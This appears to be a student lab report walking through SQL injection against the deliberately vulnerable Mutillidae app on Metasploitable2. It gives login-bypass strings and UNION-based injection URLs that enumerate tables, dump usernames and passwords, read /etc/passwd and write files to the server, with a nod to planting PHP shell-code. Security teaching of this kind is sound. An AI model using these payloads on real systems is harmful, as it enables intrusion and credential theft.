
# Exploiting SQL Injection vulnerability

## AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL 

Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database.


Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/e311635e-016a-4cc0-9f4b-647802c68f40)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/dc846735-f966-4b5e-b3fc-40ac4069efb0)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/cfcc3587-e946-49fc-88cf-2c8349070218)

Click on the menu Login/Register and register for an account

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/7984d3d4-9e17-4bb4-89cc-0305d1f0967c)

Click on the link “Please register here”

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/91614273-6e2d-4077-b741-8e25b21d3acf)

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/d055537a-069a-4860-af5b-7a2ff1e03533)

Click on “Create Account” to display the following page:

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/76ad51db-a3aa-495c-be3e-03c8b052d0bb)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username 

and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
 
 ![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/1d5964ea-6099-4ee1-b8be-652d50084b59)

 Click “Login”. The logged in page will show as below:

 ![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/230defd2-d26e-45ee-9c5c-348a12376927)

 ## Bypassing login field
 The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username 
 
 filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and 

gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/e0dbe18e-083a-4795-8598-4b75c9721161)

Click the login button and you will see it enter into the administrator page.

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/94e3dce1-e51f-47ea-9e7c-96f824cf80b3)

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the 

attacker must craft a “SELECT” statement like the first inquiry. 

we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/c59c6632-0602-43b8-acf5-45db29aadb64)

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/5ad71c6f-d1b6-49e9-b141-b981ffbe1342)

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/27ed6626-3cfd-4dfd-b584-66079ebd17e1)

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/774339db-802b-49c4-aa95-8ad53113006b)

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/6bad4597-f897-429f-9182-cc52072552a1)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original 

query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/6a1453a5-a9fd-43d5-8cdb-40bce9714d96)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we 

incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/f3878f33-aaad-45e3-a651-fa8f071ff142)

After adding the order by 6 into the existing url , the following error statement will be obtained:

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/442cf7ef-c63f-4bf7-9881-be173b76199d)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 

replacing 6.

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/b3faf730-55c2-4d08-8ce5-ad191975935a)

 As it is having 5 columns the query worked fine and it provides the correct result
 
![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/e45374f5-fda7-4f6c-99d0-48d43bf3646c)

 Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).
 
 ![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/42e6a910-9904-4297-a64d-5ceca4321ff2)

 As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

 ![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/c335915c-3766-4431-ad43-b7e975cd5059)

 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/0eb145ed-0a75-4d46-8c51-48d5708191e1)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.

In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:

union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/3a57e755-40da-4d54-9dba-b7c6cd1ace7f)

The url once executed will  retrieve table names from the “owasp 10” database.

## Extracting sensitive data such as passwords
When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/5c9a4fa2-a135-4474-8af4-0eeb30daa628)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/fd338e2d-8b91-4f30-b377-3e0808857ca1)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/0f19e88e-5091-4e09-a788-ab4cacdcb145)


## Reading and writing files on the web-server

We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and 

passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/9ecb843f-8926-48bc-8eba-80215d962ad0)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the 

“/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.

Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
